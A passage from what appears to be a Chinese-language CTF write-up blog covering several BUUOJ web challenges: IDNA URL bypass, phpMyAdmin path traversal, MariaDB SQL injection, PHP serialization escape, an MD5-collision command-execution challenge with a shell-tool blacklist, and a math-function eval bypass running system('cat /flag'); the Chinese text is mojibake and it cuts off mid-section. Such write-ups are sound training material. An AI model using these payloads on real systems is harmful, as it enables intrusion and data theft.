class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"æˆ‘æ‰Œ your problem? 333"</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>ç»™äº†æºç ï¼Œæ‰¾äº†èµ„æ–™ï¼Œå‘ç°ä¸€å¼ å¾ˆæœ‰ç”¨çš„å›¾ç‰‡</p><img src="/2020/05/11/buuoj2/16.png" class="" title="examplename"><p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œurlå‰é¢éƒ¨åˆ†æ˜¯suctf.cc,ä½†æ˜¯æºç ä¸­è¿›è¡Œäº†æ›¿æ¢ï¼Œæ‰€ä»¥cå¯ä»¥ç”¨câ„†ä»£æ›¿</p><p>å†æ˜¯æœ‰å…³nginxçš„</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nginxé…ç½®æ–‡ä»¶</span><br><span class="line">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx</span><br><span class="line">ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf</span><br><span class="line">ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service</span><br><span class="line">æ¨¡å—ï¼š/usr/lisb64/nginx/modules</span><br><span class="line">åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx</span><br><span class="line">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html</span><br><span class="line">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</span><br><span class="line">é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>payloadï¼šfile://suctf.câ„†sr/local/nginx/conf/nginx.confï¼Œæ‰¾åˆ°flagæ‰€åœ¨</p><img src="/2020/05/11/buuoj2/17.png" class="" title="examplename"><h4 id="0X08-GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#0X08-GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="0X08:[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>0X08:[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h4><p>ä¸€å †ä¹±ç ï¼Œæ‰«æï¼Œå‘ç°robots.txt,è¿˜æ‰¾åˆ°äº†phpmyadmin,æ²¡æœ‰å¯†ç ç›´æ¥ç™»å½•</p><img src="/2020/05/11/buuoj2/18.png" class="" title="examplename"><img src="/2020/05/11/buuoj2/19.png" class="" title="examplename"><p>åç»­æ€è·¯é™„ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>payloadï¼š?target=db_datadict.php%253f/../../../../../../../../flag</p><img src="/2020/05/11/buuoj2/20.png" class="" title="examplename"><h4 id="0X09-SWPU2019-Web1"><a href="#0X09-SWPU2019-Web1" class="headerlink" title="0X09:[SWPU2019]Web1"></a>0X09:[SWPU2019]Web1</h4><p>è™šå‡ç™»å½•ç•Œé¢ï¼Œæ³¨å†Œç™»å½•æœ‰ä¸€ä¸ªå‘å¸ƒå¹¿å‘Šï¼Œä¸æ˜¯sqlå°±æ˜¯xssï¼Œç»è¿‡æµ‹è¯•åº”è¯¥æ˜¯sqlï¼Œæµ‹è¯•äº†æŒºä¹…æ²¡æœ‰æ€è·¯ï¼Œæ‰¾äº†wpï¼Œæ˜¯MariaDBçš„sqlæ³¨å…¥</p><img src="/2020/05/11/buuoj2/21.png" class="" title="examplename"><p>è¿‡æ»¤äº†ä»€ä¹ˆè‡ªå·±å»æµ‹è¯•å§ï¼Œç›´æ¥é™„ä¸Špayload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>, (<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/22.png" class="" title="examplename"><h4 id="0X10-å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#0X10-å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="0X10:[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>0X10:[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>functionæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ ¹æ®æç¤ºåœ¨phpinfo()é¡µé¢å¯ä»¥æ‰¾åˆ°æç¤ºï¼Œè®¿é—®ä¸€ä¸‹</p><img src="/2020/05/11/buuoj2/23.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°è‡ªåŠ¨åŒ…å«äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€ä¸èƒ½è¯»å–æ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°åº”è¯¥è¦ç”¨åºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸ï¼Œåºåˆ—åŒ–æ—¶ä¼šç»è¿‡ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œè¿‡æ»¤æ‰çš„å­—ç¬¦åœ¨åºåˆ—åŒ–æ•°æ®ä¸­å°±å¯ä»¥å»æ‰ä¸€äº›ä¸å¿…è¦çš„æ•°æ®</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:â€œimgâ€;s:<span class="number">20</span>:â€œZDBnM19mMWFnLnBocA==â€;s:<span class="number">2</span>:â€œddâ€;s:<span class="number">1</span>:â€œaâ€;&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:â€œuserâ€;s:<span class="number">24</span>:â€œflagflagflagflagflagflagâ€;s:<span class="number">8</span>:â€œ<span class="function"><span class="keyword">function</span>â€</span>;s:<span class="number">59</span>:â€œaâ€;s:<span class="number">3</span>:â€œimgâ€;s:<span class="number">20</span>:â€œZDBnM19mMWFnLnBocA==â€;s:<span class="number">2</span>:â€œddâ€;s:<span class="number">1</span>:â€œaâ€;&#125;<span class="string">";s:3:â€œimgâ€;s:28:â€œL3VwbG9hZC9ndWVzdF9pbWcuanBnâ€;&#125;</span></span><br><span class="line"><span class="string">//ç”±äºæ²¡æœ‰ä¼ img_pathå‚æ•°ï¼Œæºä»£ç ç»™äº†é»˜è®¤çš„å‚æ•°å€¼guest_img.png</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡è¿‡æ»¤ä¹‹åflagè¢«å»æ‰ï¼Œç©ºå‡ºäº†24ä¸ªå­—ç¬¦å°±ä¼šå¾€åæ‹¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:â€œuserâ€;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:â€œ<span class="function"><span class="keyword">function</span>â€</span>;s:<span class="number">59</span>:â€œaâ€;s:<span class="number">3</span>:â€œimgâ€;s:<span class="number">20</span>:â€œZDBnM19mMWFnLnBocA==â€;s:<span class="number">2</span>:â€œddâ€;s:<span class="number">1</span>:â€œaâ€;&#125;<span class="string">";s:3:â€œimgâ€;s:28:â€œL3VwbG9hZC9ndWVzdF9pbWcuanBnâ€;&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·a:3åˆšå¥½æœ‰ä¸‰ä¸ªé”®å€¼å¯¹ï¼Œåé¢çš„<code>&quot;;s:3:â€œimgâ€;s:28:â€œL3VwbG9hZC9ndWVzdF9pbWcuanBnâ€;}</code>å°±è¢«å»æ‰äº†</p><img src="/2020/05/11/buuoj2/24.png" class="" title="examplename"><p>å†æ”¹ä¸€ä¸‹è¦è¯»å–çš„æ–‡ä»¶base64ç¼–ç </p><img src="/2020/05/11/buuoj2/25.png" class="" title="examplename"><h4 id="0X11-å®‰æ´µæ¯-2019-easy-web"><a href="#0X11-å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="0X11:[å®‰æ´µæ¯ 2019]easy_web"></a>0X11:[å®‰æ´µæ¯ 2019]easy_web</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œåªçœ‹åˆ°äº†ä¸€ä¸ªMD5 is funï¼ŒæŠ“ä¸€ä¸‹åŒ…ï¼Œæ„Ÿè§‰imgå‚æ•°æ¯”è¾ƒå¯ç–‘</p><img src="/2020/05/11/buuoj2/26.png" class="" title="examplename"><p>base64è§£å¯†ä¸¤æ¬¡ï¼Œhexè§£å¯†ä¸€æ¬¡ï¼Œå‘ç°æ˜¯555.pngï¼Œé‚£ä¹ˆindex.phphexåŠ å¯†ï¼Œå†base64åŠ å¯†ä¸¤æ¬¡å¯èƒ½å¯ä»¥è®¿é—®</p><p>æˆåŠŸæ‹¿åˆ°æºç ï¼Œå»æ‰äº†éƒ¨åˆ†æ²¡ç”¨çš„ä¸œè¥¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5ç¢°æ’ç›´æ¥å¯ä»¥æ‰¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰çš„è¯»å–æ–¹å¼ï¼Œä¸Šæ¬¡çš„æ¯”èµ›è®°å¾—catå¯ä»¥ç”¨ca\tç»•è¿‡ï¼Œå…·ä½“çš„åŸå› ä¹Ÿæ²¡æœ‰å»æŸ¥æ‰¾èµ„æ–™ï¼Œæœ‰æ—¶é—´å†å¼„ï¼Œè¿™é‡Œç›´æ¥æ‹¿æ¥ç”¨äº†</p><img src="/2020/05/11/buuoj2/27.png" class="" title="examplename"><p>åœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagæ–‡ä»¶ï¼Œç›´æ¥è¯»å–</p><img src="/2020/05/11/buuoj2/28.png" class="" title="examplename"><h4 id="0X12-CISCN-2019-åˆèµ›-Love-Math"><a href="#0X12-CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="0X12:[CISCN 2019 åˆèµ›]Love Math"></a>0X12:[CISCN 2019 åˆèµ›]Love Math</h4><p>æºç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä¸­æœ‰é•¿åº¦é™åˆ¶ï¼Œä¸­æ‹¬å·è¢«banæ‰äº†ï¼Œè¦ç”¨è¿›åˆ¶è½¬æ¢ï¼Œbase_convert ï¼Œdechexï¼Œç¬¬ä¸€ä¸ªå¯ä»¥è¿›è¡Œè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ï¼Œæ¯”å¦‚ base_convert(â€œ1001â€2,10)æ˜¯å°†äºŒè¿›åˆ¶çš„1001è½¬æ¢ä¸º10è¿›åˆ¶ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯å°†10è¿›åˆ¶è½¬æˆ16è¿›åˆ¶ã€‚payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat falg</span><br></pre></td></tr></table></figure><p>å†ç”¨è¿›åˆ¶è½¬æ¢ä¸€ä¸‹ï¼Œç”¨ä¸Šä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure><h4 id="0X13-CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#0X13-CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="0X13:[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>0X13:[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h4><img src="/2020/05/11/buuoj2/29.png" class="" title="examplename"><p>éœ€è¦æ‰¾åˆ°lv6ï¼Œæ‰‹ç¿»äº†å‡ é¡µï¼Œæ‰¾ä¸åˆ°ï¼Œå†™ä¸ªè„šæœ¬æ¥æ‰¾</p><img src="/2020/05/11/buuoj2/30.png" class="" title="examplename"><p>åœ¨181é¡µï¼Œå¯ä»¥çœ‹åˆ°ä»·æ ¼å¤ªé«˜äº†ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯jsèƒ½åšä¿®æ”¹ï¼Œå‘ç°discountçš„å€¼èƒ½æ”¹ï¼Œæ”¹æˆä¸€ä¸ªå¾ˆå°çš„å€¼ï¼Œæç¤ºéœ€è¦ä¸ºadminæ‰èƒ½è®¿é—®ï¼Œåœ¨cookieé‡Œæ‰¾åˆ°äº†jwtï¼Œæ”¾åˆ°jwt.io</p><img src="/2020/05/11/buuoj2/31.png" class="" title="examplename"><p>éœ€è¦è®©usernameä¸ºadminï¼Œè¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªç ´è§£å·¥å…·jwtcrack<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p><img src="/2020/05/11/buuoj2/32.png" class="" title="examplename"><p>å¼„åˆ°äº†å¯†é’¥ï¼Œå°±èƒ½å¤Ÿæ›´æ”¹å¾—åˆ°éœ€è¦çš„jwtäº†ï¼Œå†ä¿®æ”¹cookieï¼Œæç¤ºè¦æˆä¸ºå¤§ä¼šå‘˜ï¼Œå†æºç å¤„å‘ç°äº†<a 